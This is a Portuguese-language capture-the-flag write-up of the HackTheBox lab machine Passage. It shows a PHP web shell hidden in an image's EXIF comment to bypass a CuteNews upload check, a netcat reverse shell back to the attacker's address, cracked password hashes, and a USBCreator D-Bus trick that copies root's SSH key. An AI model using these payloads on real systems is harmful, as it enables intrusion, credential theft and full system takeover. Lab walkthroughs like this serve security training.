<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>


Back to all write-ups: [here](https://repo4chu.github.io/hackthebox/)

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
Passage - HackTheBox - WriteUp by [chu](https://app.hackthebox.eu/profile/148108)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
![Image](https://i.imgur.com/9iTXQiJ.png)

Machine Maker: [ChefByzen](https://www.hackthebox.eu/home/users/profile/140851)


• Nessa máquina vamos utilizar a falha [Arbitrary File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) utilizando uma técnica de enviar uma imagem com um código PHP dentro dela através da ediçaõ da requisição em nosso proxy(Burp Suite) e assim nos possibilitando a execução de código remoto.


**Tools** utilizadas:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap
exiftool
BurpSuite
netcat
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Usaremos o nmap para encontrar portas e serviços rodando na máquina:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nmap -v -sS -Pn -A 10.10.10.206

-v: verbose(output mais detalhado).
-sS: syn scan.
-Pn: já sabemos que o host está ativo então desativamos o discovery.
-A: Detecção de OS, detecção de versão, script scanning, and traceroute
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Nosso resultado:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 17:eb:9e:23:ea:23:b6:b1:bc:c6:4f:db:98:d3:d4:a1 (RSA)
|   256 71:64:51:50:c3:7f:18:47:03:98:3e:5e:b8:10:19:fc (ECDSA)
|_  256 fd:56:2a:f8:d0:60:a7:f1:a0:a1:47:a4:38:d6:a8:a1 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Passage News
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/6%OT=22%CT=1%CU=37302%PV=Y%DS=2%DC=T%G=Y%TM=5FF5BCD0
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=10A%GCD=1%ISR=10C%TI=Z%CI=I%II=I%TS=A)SEQ(
OS:SP=10A%GCD=2%ISR=10C%TI=Z%II=I%TS=A)OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3
OS:=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)WIN(W1=7120%W2=7
OS:120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW
OS:7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF
OS:=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=
OS:%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=
OS:0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 14.778 days (since Tue Dec 22 13:56:06 2020)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=266 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 995/tcp)
HOP RTT       ADDRESS
1   188.90 ms 10.10.14.1
2   189.09 ms passage.htb (10.10.10.206)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Podemos ver duas portas abertas, a 22(SSH) e a 80(HTTP).

Ao acessar a porta 80, nos deparamos com um website.
![Image](https://i.imgur.com/grJc9Zf.png)


Ao analisar o código fonte, podemos perceber que o site está utilizando um CMS(Sistema de gerenciamento de conteúdo) chamado 'CuteNews'.
![Image](https://i.imgur.com/ETMGKo8.png)


Acessando o diretório do CMS, encontramos uma página de login e a versão do CuteNews(2.1.2)
![Image](https://i.imgur.com/E6Wa1kL.png)


Como não temos credenciais válidas, vamos tentar realizar a criação de um novo usuário pelo botão de 'Register'
![Image](https://i.imgur.com/ipJ8Q6W.png)


Após conseguirmos o acesso inicial no CMS, podemos encontrar um campo de Upload de avatar na página de edição do perfil do usuário, portanto, podemos tentar fazer o upload de um arquivo malicioso. (:
![Image](https://i.imgur.com/crQgsxz.png)


Tentamos primeiro fazer upload de arquivos em PHP, porém, não foi possivel subir um arquivo com esta extensão...
Como é um campo de upload de 'Avatar' podemos deduzir que o campo aceitará imagens, então, vamos inserir um código malicioso dentro de nossa imagem. 
Nosso código executa a função system do PHP através do parametro cmd recebido via GET.
Para isso vamos utilizar o exiftool:

![Image](https://i.imgur.com/yECy7Qo.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' chu.jpeg;
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Podemos conferir que conseguimos escrever o comentário dentro da imagem:
![Image](https://i.imgur.com/hHNNM0w.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
exiftool chu.jpeg
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Agora vamos tentar fazer o upload.
Primeiro vamos ligar o BurpSuite(proxy) para interceptar a requisição e edita-la.
![Image](https://i.imgur.com/SsZQS3v.png)

Ao interceptar a nossa requisição no Burp podemos ver que a extensão que está sendo enviada é a (.jpeg), como pede o campo no site.
![Image](https://i.imgur.com/O2QrZkx.png)

Vamos altera-la para .php e encaminhar a requisição.
![Image](https://i.imgur.com/gO1W4Nl.png)

Podemos perceber que a requisição foi bem sucedida(200)

![Image](https://i.imgur.com/0CZunKi.png)

Agora basta acessarmos nosso arquivo para poder executar comandos no servidor, para isso vamos até o diretório onde são salvos os avatares: http://passage.htb/CuteNews/uploads/avatar_chu_chu.php 
![Image](https://i.imgur.com/AXunvx1.png)

Conseguimos acessar nosso arquivo, agora podemos passar comandos do Linux pelo parametro pré definido, em meu caso 'cmd'.
Com isso temos uma execução de código remoto :D
![Image](https://i.imgur.com/RU7sxGJ.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=id
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Ao pesquisar pelo nc, podemos ver que ele está instalado, portanto, vamos tentar utiliza-lo para receber uma [reverse shell](https://tiagosouza.com/reverse-shell-cheat-sheet-bind-shell/).
![Image](https://i.imgur.com/5NgSWmB.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=whereis nc
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Vamos abrir uma porta em nossa máquina.

![Image](https://i.imgur.com/55Noqa6.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nc -vvnlp 1337

-vv: verbose 2
-n: nodns
-l: listen
-p: port
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Agora vamos enviar a conexão com o netcat
![Image](https://i.imgur.com/IrydT8Z.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
http://passage.htb/CuteNews/uploads/avatar_chu_chu.php?cmd=/bin/nc 10.10.14.238 1337 -e /bin/bash

-e: exec 'command'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

![Image](https://i.imgur.com/FswUPdW.png)

w00t, estamos dentro!

Podemos melhorar nossa shell com python para ela se tornar interativa
![Image](https://i.imgur.com/KnYikce.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
python -c 'import pty;pty.spawn("/bin/bash")'
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Após um tempo procurando algo para escalar privilégios, podemos encontrar um arquivo chamado lines, no diretório: /var/www/html/CuteNews/cdata/users/lines
![Image](https://i.imgur.com/sxqmNKL.png)

Podemos perceber que está em base64, portanto vamos decodar. Para isso vamos utilizar o site [CyberChef](https://gchq.github.io/CyberChef/)

Após isso, temos uma saída mais limpa contendo algumas hashs:

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
a:1:{s:4:"name";a:1:{s:5:"admin";a:8:{s:2:"id";s:10:"1592483047";s:4:"name";s:5:"admin";s:3:"acl";s:1:"1";s:5:"email";s:17:"nadav@passage.htb";s:4:"pass";s:64:"7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1";s:3:"lts";s:10:"1592487988";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}

a:1:{s:4:"name";a:1:{s:9:"sid-meier";a:9:{s:2:"id";s:10:"1592483281";s:4:"name";s:9:"sid-meier";s:3:"acl";s:1:"3";s:5:"email";s:15:"sid@example.com";s:4:"nick";s:9:"Sid Meier";s:4:"pass";s:64:"4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88";s:3:"lts";s:10:"1592485645";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}

a:1:{s:4:"name";a:1:{s:10:"paul-coles";a:9:{s:2:"id";s:10:"1592483236";s:4:"name";s:10:"paul-coles";s:3:"acl";s:1:"2";s:5:"email";s:16:"paul@passage.htb";s:4:"nick";s:10:"Paul Coles";s:4:"pass";s:64:"e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd";s:3:"lts";s:10:"1592485556";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"2";}}}

a:1:{s:4:"name";a:1:{s:9:"kim-swift";a:9:{s:2:"id";s:10:"1592483309";s:4:"name";s:9:"kim-swift";s:3:"acl";s:1:"3";s:5:"email";s:15:"kim@example.com";s:4:"nick";s:9:"Kim Swift";s:4:"pass";s:64:"f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca";s:3:"lts";s:10:"1592487096";s:3:"ban";s:1:"0";s:3:"cnt";s:1:"3";}}}

a:1:{s:4:"name";a:1:{s:6:"egre55";a:11:{s:2:"id";s:10:"1598829833";s:4:"name";s:6:"egre55";s:3:"acl";s:1:"4";s:5:"email";s:15:"egre55@test.com";s:4:"nick";s:6:"egre55";s:4:"pass";s:64:"4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc";s:4:"more";s:60:"YToyOntzOjQ6InNpdGUiO3M6MDoiIjtzOjU6ImFib3V0IjtzOjA6IiI7fQ==";s:3:"lts";s:10:"1598834079";s:3:"ban";s:1:"0";s:6:"avatar";s:26:"avatar_egre55_spwvgujw.php";s:6:"e-hide";s:0:"";}}}
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

hashs:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
nadav:7144a8b531c27a60b51d81ae16be3a81cef722e11b43a26fde0ca97f9e1485e1
sid:4bdd0a0bb47fc9f66cbf1a8982fd2d344d2aec283d1afaebb4653ec3954dff88
paul:e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd >> cracked: atlanta1
kim:f669a6f691f98ab0562356c0cd5d5e7dcdc20a07941c86adcfce9af3085fbeca
egre55:4db1f0bfd63be058d4ab04f18f65331ac11bb494b5792c480faf7fb0c40fa9cc >> cracked: egre55
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Usando o site [Crackstation](https://crackstation.net/) tivemos sucesso quebrando 2 senhas.
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
paul:atlanta1
egre55:egre55
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Listando a pasta /home podemos perceber que paul é um usuário válido, então tentamos acessa-lá:
E conseguimos!

![Image](https://i.imgur.com/ydajewv.png)


Após isso podemos encontrar chaves RSA para fazermos a conexão via SSH
![Image](https://i.imgur.com/7DgpU4z.png)


Agora podemos nos conectar via ssh :D
![Image](https://i.imgur.com/GSIodbP.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ssh paul@passage.htb -i id_rsa_paul
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Após melhorar nossa conexão usando o SSH, analisando melhor a pasta /home/paul/.ssh/ podemor perceber que existe um arquivo de autorização (authorized_keys)...
dentro dele temos uma chave pública.
![Image](https://i.imgur.com/YrgxUDa.png)


Então agora logamos como 'nadav'

![Image](https://i.imgur.com/G7Ko2Uy.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ssh nadav@passage
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Agora logados como 'nadav', começamos a procurar um maneira de escalar privilégios.
![Image](https://i.imgur.com/n3aPLv7.png)

Ao analisar os processos rodando como root, pude perceber que existe um processo chamado: 'usb-creator-helper'
![Image](https://i.imgur.com/RxRhFul.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ps aux | grep root
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

O [Artigo](https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/) nos da uma boa pista(até o nome do user \o/)

Com isso, podemos obter a chave RSA do root.
![Image](https://i.imgur.com/RsLZba2.png)
Podemos perceber que o arquivo é criado como root
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /tmp/chu/chu.txt true
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Agora basta logarmos usando a chave
![Image](https://i.imgur.com/9UCzj7K.png)
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
ssh root@passage.htb -i id_rsa_root
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


if i helped you, add + respect at my [profile](https://app.hackthebox.eu/profile/148108) :D
<html>
 <body>
  <script src="https://www.hackthebox.eu/badge/148108"></script>
 </body>
 </html>


My references:
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
https://www.exploit-db.com/exploits/48458
https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/
https://tiagosouza.com/reverse-shell-cheat-sheet-bind-shell/
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
